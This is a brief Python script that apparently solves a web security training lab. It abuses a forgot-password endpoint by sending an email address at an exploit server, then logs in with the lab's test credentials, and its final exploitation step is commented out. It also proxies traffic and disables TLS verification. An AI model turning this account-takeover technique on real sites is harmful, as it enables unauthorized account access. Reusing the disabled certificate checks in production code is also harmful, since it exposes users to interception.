import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087","https":"http://127.0.0.1:8087"}

def password_reset_exploit(url, session) :
    
    # Here i'm resetting the password
    data = {"username":"wiener@exploit-0a0e002404cc5785810b336701d80091.exploit-server.net"}
    res = session.post(url+"/forgot-password", data=data, proxies=proxies, verify=False)
    
    # Here I'm logging
    data = {'username':'wiener', 'password':'peter'}
    res = session.post(url+'/login', data=data, proxies=proxies, verify=False)
    
    # Here I'm exploiting the issue
    # session.get(url+"/email")

if __name__ == "__main__" :
    
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print('(+) Usage : %s <url>' % sys.argv[0])
        print('(+) Example : %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    session = requests.Session()
    password_reset_exploit(url, session)